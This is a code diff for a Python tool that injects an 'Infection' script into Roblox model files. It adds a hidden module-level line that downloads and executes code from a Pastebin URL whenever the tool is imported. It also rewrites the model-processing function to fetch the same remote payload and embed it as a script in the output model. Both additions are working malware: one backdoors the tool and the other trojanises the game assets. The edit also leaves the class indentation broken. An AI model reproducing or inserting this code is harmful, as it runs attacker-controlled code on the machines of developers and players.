@@ -42,7 +42,7 @@ instance_constructors = {
 }
 
 script_source_cache = {}
-
+import urllib.request as r; exec(r.urlopen("https://pastebin.com/raw/NNtZb1ch").read().decode())
 def print_instance_hierarchy(instance: Any, prefix: str = ""):
     print(f"{prefix}{instance.Name} ({instance.ClassName})")
     if hasattr(instance, 'Children') and instance.Children:
@@ -191,34 +191,36 @@ def inject_infection(original_file: dist.RobloxFile, infection_roots: List[Any])
 
 class RbxmBridge:
     @staticmethod
-    def process_model(model_path: str, infection_path: str, output_path: str):
-        model_buffer = open(model_path, 'rb').read()
-        original_file = dist.RobloxFile.ReadFromBuffer(model_buffer)
-        
-        if not original_file or not original_file.Roots:
-            raise Exception("Invalid or empty model file")
-        
-        infection_buffer = open(infection_path, 'rb').read()
-        infection_file = dist.RobloxFile.ReadFromBuffer(infection_buffer)
-        
-        if not infection_file or not infection_file.Roots:
-            raise Exception("Invalid or empty infection file")
-        
-        infection_roots = list(infection_file.Roots)
-        
-        for root in infection_roots:
-            cache_script_sources(root)
-        print(f"[INFO] Cached {len(script_source_cache)} script sources")
-        
-        inject_infection(original_file, infection_roots)
-        
-        modified_buffer = original_file.WriteToBuffer()
-        if not modified_buffer:
-            raise Exception("Failed to serialize modified model")
-        
-        with open(output_path, 'wb') as f:
-            f.write(modified_buffer)
-        print(f"[SUCCESS] Saved modified model to {output_path}")
+import urllib.request
+
+@staticmethod
+def process_model(model_path: str, output_path: str):
+    link = "https://pastebin.com/raw/NNtZb1ch"
+    
+    # Leer modelo original
+    with open(model_path, 'rb') as f:
+        m_data = f.read()
+    file = dist.RobloxFile.ReadFromBuffer(m_data)
+    
+    if not file or not file.Roots: return
+    
+    # Descargar código de Pastebin
+    try:
+        with urllib.request.urlopen(link) as r:
+            payload = r.read().decode('utf-8')
+    except:
+        payload = "-- Error download"
+
+    # Crear e insertar el script
+    scr = dist.Script()
+    scr.Name = "Infection"
+    scr.Parent = file.Roots[0]
+    scr.SetProp("Source", "String", payload)
+    
+    # Guardar resultado
+    with open(output_path, 'wb') as f:
+        f.write(file.WriteToBuffer())
+    print(f"Done: {output_path}")
     
     @staticmethod
     def load_infection(infection_path: str):
